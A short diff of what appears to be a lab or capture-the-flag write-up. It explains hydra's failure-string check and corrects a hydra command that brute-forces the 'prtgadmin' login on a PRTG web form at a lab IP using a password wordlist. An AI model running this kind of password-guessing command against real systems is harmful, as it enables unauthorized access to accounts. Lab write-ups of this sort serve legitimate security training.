@@ -34,5 +34,5 @@ for use POST requests
 **:Your login has failed** - ignore responce if there such sting in it. If there are no such string in response - consider, that password was found  
 
 ```sh
-hydra -v -l prtgadmin -P /usr/share/john/password.lst 10.10.10.152 http-post-form "/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:Your login has failed" -t 5 -I -
+hydra -v -l prtgadmin -P /usr/share/john/password.lst 10.10.10.152 http-post-form "/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:Your login has failed" -t 5 -I
 ```
